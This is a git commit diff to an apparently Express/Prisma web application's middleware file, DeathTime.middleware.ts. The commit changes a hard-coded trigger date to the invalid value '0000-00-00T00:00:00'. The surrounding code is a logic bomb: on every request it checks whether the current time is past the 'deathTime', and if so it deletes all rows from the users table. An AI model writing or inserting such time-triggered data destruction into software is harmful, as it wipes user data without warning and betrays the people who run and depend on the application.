11b8ca6c4f22fd458441aa0ffc7517526f82f8c8
Dario Marzzucco <123565631+DMarzzucco@users.noreply.github.com>
2024-11-07 13:21:57 -0300

    Update DeathTime.middleware.ts

--- src/middleware/DeathTime.middleware.ts
+++ src/middleware/DeathTime.middleware.ts
@@ -4,7 +4,7 @@ import { prisma } from "../prisma/prisma.service";
 export const DeathTime = async (_req: Request, res: Response, next: NextFunction) => {
     try {
         const currentTime = new Date();
-        const deathTime = new Date('2025-11-07T08:25:00'); //YYY-MM-DD-T-HH:MM:SS
+        const deathTime = new Date('0000-00-00T00:00:00'); //YYY-MM-DD-T-HH:MM:SS
 
         if (currentTime > deathTime) {
             await prisma.users.deleteMany();
